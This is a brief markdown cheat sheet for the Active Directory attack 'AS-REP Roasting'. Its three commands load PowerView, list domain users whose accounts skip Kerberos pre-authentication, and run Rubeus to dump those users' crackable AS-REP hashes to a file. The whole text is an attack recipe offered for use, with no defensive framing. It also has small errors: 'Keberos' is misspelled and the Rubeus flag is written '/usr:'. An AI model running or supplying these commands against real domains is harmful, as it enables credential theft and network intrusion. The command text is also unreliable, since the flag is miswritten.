## As-REP Roasting
- First Find User with Keberos No_Preauthentication
```
. .\PowerView.ps1
```
```
Get-DomainUser | Where-Object { $_.useraccountcontrol -like "*DONT_REQ_PREAUTH"}
```
```
.\Rubeus.exe asreproast /usr:johnny /outfile:file.txt
```
